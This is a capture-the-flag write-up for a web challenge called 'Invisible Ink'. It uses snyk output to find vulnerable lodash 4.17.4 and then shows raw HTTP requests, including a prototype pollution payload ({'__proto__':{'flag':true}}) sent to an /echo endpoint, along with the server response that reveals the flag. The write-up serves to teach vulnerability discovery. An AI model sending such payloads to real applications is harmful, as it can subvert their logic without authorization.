# Invisible Ink

- **Category:**

## Challenge

Expose hidden vulnerabilities in the web application.

http://35.211.53.53:8000

files attached

[index.js](./index.js)
[package.json](package.json)

## Solution

Run snyk CLI to find dependencies vulnerabilities

```
> snyk test

Testing

Tested 53 dependencies for known issues, found 9 issues, 9 vulnerable paths.


Issues to fix by upgrading:

  Upgrade lodash@4.17.4 to lodash@4.17.21 to fix
  ✗ Regular Expression Denial of Service (ReDoS) [Medium Severity][https://snyk.io/vuln/SNYK-JS-LODASH-1018905] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Prototype Pollution [Medium Severity][https://snyk.io/vuln/SNYK-JS-LODASH-567746] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Regular Expression Denial of Service (ReDoS) [Medium Severity][https://snyk.io/vuln/SNYK-JS-LODASH-73639] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Prototype Pollution [Medium Severity][https://snyk.io/vuln/npm:lodash:20180130] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Command Injection [High Severity][https://snyk.io/vuln/SNYK-JS-LODASH-1040724] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Prototype Pollution [High Severity][https://snyk.io/vuln/SNYK-JS-LODASH-608086] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Prototype Pollution [High Severity][https://snyk.io/vuln/SNYK-JS-LODASH-450202] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Prototype Pollution [High Severity][https://snyk.io/vuln/SNYK-JS-LODASH-73638] in lodash@4.17.4
    introduced by lodash@4.17.4
  ✗ Prototype Pollution [Critical Severity][https://snyk.io/vuln/SNYK-JS-LODASH-590103] in lodash@4.17.4
    introduced by lodash@4.17.4


Package manager:   yarn
Target file:       yarn.lock
Project name:      Try-Snyk
Open source:       no
Licenses:          enabled

Tip: Run `snyk wizard` to address these issues.
```

There is property injection where you can overwrite the object

```
POST /echo HTTP/1.1
Host: 35.211.53.53:8000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
Content-Type: application/json
Content-Length: 6
x-forwarded-for: clobbered

{}

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 61
ETag: W/"3d-WEr+6xoby05K6Qss2K1uHSMzDhQ"
Date: Tue, 05 Oct 2021 22:47:34 GMT
Connection: close

{"userID":"clobbered","time":1633474054054,"flag":"disabled"}
```

Sending prototype pollution - property injection

```
POST /echo HTTP/1.1
Host: 35.211.53.53:8000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
Content-Type: application/json
Content-Length: 27
x-forwarded-for: clobbered

{"__proto__":{"flag":true}}


HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 123
ETag: W/"7b-Ci4QSPI4+wQNXd3R4fnh5S2lUwg"
Date: Tue, 05 Oct 2021 22:56:21 GMT
Connection: close

{"userID":"clobbered","time":1633474581449,"flag":"SNYK{6a6a6fff87f3cfdca056a077804838d4e87f25f6a11e09627062c06f142b10dd}"}
```

Flag

```
SNYK{6a6a6fff87f3cfdca056a077804838d4e87f25f6a11e09627062c06f142b10dd}
```
